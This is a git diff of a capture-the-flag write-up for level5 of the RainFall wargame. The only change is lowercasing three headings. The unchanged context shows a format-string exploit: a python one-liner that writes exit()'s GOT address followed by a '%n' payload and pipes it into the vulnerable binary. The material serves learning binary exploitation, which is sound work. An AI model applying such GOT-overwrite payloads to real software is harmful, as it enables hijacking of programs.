@@ -1,6 +1,6 @@
-# Level5
+# level5
 
-## Exploring the binary
+## exploring the binary
 ```shell
 level5@RainFall:~$ ./level5
 phantom
@@ -110,7 +110,7 @@ This reveals that <code>exit()</code> resides at address <code>0x08049838</code>
 $1 = 134513828
 ```
 
-## Exploit
+## exploit
 ``` shell
 level5@RainFall:~$ python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d%4$n"' > /tmp/flag5
 level5@RainFall:~$ cat /tmp/flag5 - | ./level5
